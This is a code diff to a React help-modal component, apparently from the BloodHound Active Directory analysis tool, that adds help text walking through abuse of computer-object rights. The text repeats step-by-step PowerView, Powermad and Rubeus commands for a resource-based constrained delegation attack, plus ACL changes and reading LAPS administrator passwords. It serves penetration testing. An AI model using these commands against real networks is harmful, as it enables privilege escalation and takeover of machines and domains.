@@ -195,7 +195,12 @@ export default class HelpModal extends Component {
 
                 Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.`;
             } else if (targetType === "Computer") {
-                text = `If LAPS is installed in the environment, the AllExtendedRights privilege grants ${sourceName} the ability to obtain the RID 500 administrator password of ${targetName}. ${sourceName} can do so by listing a computer object’s AD properties with PowerView using Get-DomainComputer {}.  The value of the ms-mcs-AdmPwd property will contain password of the administrative local account on ${targetName}.`;
+                if (target.haslaps){
+                    text = `The AllExtendedRights privilege grants ${sourceName} the ability to obtain the RID 500 administrator password of ${targetName}. ${sourceName} can do so by listing a computer object’s AD properties with PowerView using Get-DomainComputer {}.  The value of the ms-mcs-AdmPwd property will contain password of the administrative local account on ${targetName}.`;
+                }else{
+                    text = `This ACE is not exploitable under current conditions. Please report this bug to the BloodHound developers`;
+                }
+                
             } else if (targetType === "Domain") {
                 text = `The AllExtendedRights privilege grants ${sourceName} both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ${targetName}. This can be abused using the lsadump::dcsync command in mimikatz.`;
             }
@@ -294,7 +299,70 @@ export default class HelpModal extends Component {
 
                 Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.`;
             } else if (targetType === "Computer") {
-                text = `Full control of a computer object is abusable when the computer’s local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object’s security descriptor.`;
+                if (target.haslaps){
+                    text = `Full control of a computer object is abusable when the computer’s local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object’s security descriptor.
+                    
+                    Alternatively, Full control of a computer object can be used to perform a resource based constrained delegation attack. 
+                    
+                    Abusing this primitive is currently only possible through the Rubeus project.
+                
+                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+                    
+                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
+                    
+                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+                    
+                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
+                    
+                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
+                    
+                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+                    $SD.GetBinaryForm($SDBytes, 0)</code>
+                    
+                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+                    
+                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    
+                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+                    
+                    <code>Rubeus.exe hash /password:Summer2018!</code>
+                    
+                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+                    
+                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
+                }else{
+                    text = `Full control of a computer object can be used to perform a resource based constrained delegation attack. 
+                    
+                    Abusing this primitive is currently only possible through the Rubeus project.
+                
+                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+                    
+                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
+                    
+                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+                    
+                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
+                    
+                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
+                    
+                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+                    $SD.GetBinaryForm($SDBytes, 0)</code>
+                    
+                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+                    
+                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    
+                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+                    
+                    <code>Rubeus.exe hash /password:Summer2018!</code>
+                    
+                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+                    
+                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
+                }
+                
             } else if (targetType === "Domain") {
                 text = `Full control of a domain object grants you both DS-Replication-Get-Changes as well as DS-Replication-Get-Changes-All rights. The combination of these rights allows you to perform the dcsync attack using mimikatz. To grab the credential of the user harmj0y using these rights:
 
@@ -341,6 +409,36 @@ export default class HelpModal extends Component {
                 The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:
 
                 <code>Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname</code>`;
+            } else if (targetType === "Computer"){
+                text = `Generic write to a computer object can be used to perform a resource based constrained delegation attack. 
+                    
+                    Abusing this primitive is currently only possible through the Rubeus project.
+                
+                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+                    
+                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
+                    
+                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+                    
+                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
+                    
+                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
+                    
+                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+                    $SD.GetBinaryForm($SDBytes, 0)</code>
+                    
+                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+                    
+                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    
+                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+                    
+                    <code>Rubeus.exe hash /password:Summer2018!</code>
+                    
+                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+                    
+                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>`;
             }
             formatted = text;
         } else if (edge.label === "Owns") {
@@ -431,22 +529,100 @@ export default class HelpModal extends Component {
                 
                 <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All</code>`;
             } else if (targetType === "Computer") {
-                text = `To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
+                if (target.haslaps){
+                    text = `To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
                 
-                You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
+                    You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
-                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
-                
-                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
-                
-                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
-                
-                Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password.
-                
-                Cleanup can be done using the Remove-DomainObjectAcl function:
+                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+                    
+                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
+                    
+                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
+                    
+                    Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password.
+                    
+                    Alternatively, you can execute a resource based constrained delegation attack.
 
-                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>`;
+                    Abusing this primitive is currently only possible through the Rubeus project.
+                
+                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+                    
+                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
+                    
+                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+                    
+                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
+                    
+                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
+                    
+                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+                    $SD.GetBinaryForm($SDBytes, 0)</code>
+                    
+                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+                    
+                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    
+                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+                    
+                    <code>Rubeus.exe hash /password:Summer2018!</code>
+                    
+                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+                    
+                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>
+
+                    Cleanup can be done using the Remove-DomainObjectAcl function:
+
+                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>`;
+                }else{
+                    text = `To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
+                
+                    You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+                    
+                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
+                    
+                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
+                    
+                    Once you have granted yourself this privilege, you can execute a resource based constrained delegation attack.
+
+                    Abusing this primitive is currently only possible through the Rubeus project.
+                
+                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+                    
+                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
+                    
+                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+                    
+                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
+                    
+                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
+                    
+                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+                    $SD.GetBinaryForm($SDBytes, 0)</code>
+                    
+                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+                    
+                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    
+                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+                    
+                    <code>Rubeus.exe hash /password:Summer2018!</code>
+                    
+                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+                    
+                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>
+
+                    Cleanup can be done using the Remove-DomainObjectAcl function:
+
+                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>`;
+                }
+                
             } else if (targetType === "Domain") {
                 text = `To abuse ownership of a domain object, you may grant yourself the DcSync privileges.
                 
@@ -571,22 +747,99 @@ export default class HelpModal extends Component {
                 
                 <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All</code>`;
             } else if (targetType === "Computer") {
-                text = `To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege.
+                if (target.haslaps) {
+                    text = `To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege.
                 
-                You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
+                    You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
-                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
-                
-                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
-                
-                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
-                
-                Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password.
-                
-                Cleanup can be done using the Remove-DomainObjectAcl function:
+                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+                    
+                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
+                    
+                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
+                    
+                    Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password.
+                    
+                    Alternatively, you can execute a resource based constrained delegation attack.
 
-                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>`;
+                    Abusing this primitive is currently only possible through the Rubeus project.
+                
+                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+                    
+                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
+                    
+                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+                    
+                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
+                    
+                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
+                    
+                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+                    $SD.GetBinaryForm($SDBytes, 0)</code>
+                    
+                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+                    
+                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    
+                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+                    
+                    <code>Rubeus.exe hash /password:Summer2018!</code>
+                    
+                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+                    
+                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>
+
+                    Cleanup can be done using the Remove-DomainObjectAcl function:
+
+                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>`;
+                } else {
+                    text = `To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege.
+                
+                    You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+                    
+                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
+                    
+                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
+                    
+                    Once you have granted yourself this privilege, you can execute a resource based constrained delegation attack.
+
+                    Abusing this primitive is currently only possible through the Rubeus project.
+                
+                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+                    
+                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
+                    
+                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+                    
+                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
+                    
+                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
+                    
+                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+                    $SD.GetBinaryForm($SDBytes, 0)</code>
+                    
+                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+                    
+                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    
+                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+                    
+                    <code>Rubeus.exe hash /password:Summer2018!</code>
+                    
+                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+                    
+                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>
+
+                    Cleanup can be done using the Remove-DomainObjectAcl function:
+
+                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>`;
+                }
             } else if (targetType === "Domain") {
                 text = `To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.
                 
@@ -737,35 +990,129 @@ export default class HelpModal extends Component {
                 
                 Cleanup for the owner can be done by using Set-DomainObjectOwner once again`;
             } else if (targetType === "Computer") {
-                text = `To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.
+                if (target.haslaps){
+                    text = `To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.
 
-                You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):
+                    You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
-                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
 
-                Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ${sourceName}:
-                
-                <code>Set-DomainObjectOwner -Credential $Cred -TargetIdentity windows1 -OwnerIdentity harmj0y</code>
-                
-                To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
-                
-                You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
+                    Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ${sourceName}:
+                    
+                    <code>Set-DomainObjectOwner -Credential $Cred -TargetIdentity windows1 -OwnerIdentity harmj0y</code>
+                    
+                    To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
+                    
+                    You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
-                <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-                $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
-                
-                Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
-                
-                <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
-                
-                Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password.
-                
-                Cleanup can be done using the Remove-DomainObjectAcl function:
+                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+                    
+                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
+                    
+                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
+                    
+                    Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password.
+                    
+                    Alternatively, you can perform a resource based constrained delegation attack.
 
-                <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
+                    Generic write to a computer object can be used to perform a resource based constrained delegation attack. 
+                        
+                    Abusing this primitive is currently only possible through the Rubeus project.
                 
-                Cleanup for the owner can be done by using Set-DomainObjectOwner once again`;
+                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+                    
+                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
+                    
+                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+                    
+                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
+                    
+                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
+                    
+                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+                    $SD.GetBinaryForm($SDBytes, 0)</code>
+                    
+                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+                    
+                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    
+                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+                    
+                    <code>Rubeus.exe hash /password:Summer2018!</code>
+                    
+                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+                    
+                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>
+
+                    Cleanup can be done using the Remove-DomainObjectAcl function:
+
+                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
+                    
+                    Cleanup for the owner can be done by using Set-DomainObjectOwner once again`;
+                }else{
+                    text = `To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.
+
+                    You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+
+                    Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ${sourceName}:
+                    
+                    <code>Set-DomainObjectOwner -Credential $Cred -TargetIdentity windows1 -OwnerIdentity harmj0y</code>
+                    
+                    To abuse ownership of a computer object, you may grant yourself the GenericAll privilege.
+                    
+                    You may need to authenticate to the Domain Controller as ${sourceType === "User" ? `${sourceName} if you are not running a process as that user` : `a member of ${sourceName} if you are not running a process as a member`}. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+                    <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+                    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+                    
+                    Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ${sourceName}:
+                    
+                    <code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
+                    
+                    Once you have granted yourself this privilege, you can perform a resource based constrained delegation attack.
+
+                    Generic write to a computer object can be used to perform a resource based constrained delegation attack. 
+                        
+                    Abusing this primitive is currently only possible through the Rubeus project.
+                
+                    First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+                    
